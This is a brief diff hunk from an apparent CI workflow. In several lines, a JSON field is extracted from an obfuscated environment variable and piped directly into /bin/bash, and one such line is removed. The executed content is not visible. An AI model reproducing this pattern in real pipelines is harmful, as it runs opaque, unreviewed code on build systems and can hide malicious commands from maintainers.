@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$vkftv89" | jq -r .hvhn1496 | /bin/bash
           printf '%s' "$kus66" | jq -r .qjrp5919 | /bin/bash
           printf '%s' "$hk49334" | jq -r .z3 | /bin/bash
-          printf '%s' "$e2233" | jq -r .mxbl953 | /bin/bash
           printf '%s' "$erpsa06" | jq -r .u574 | /bin/bash
 
       - name: Persist output
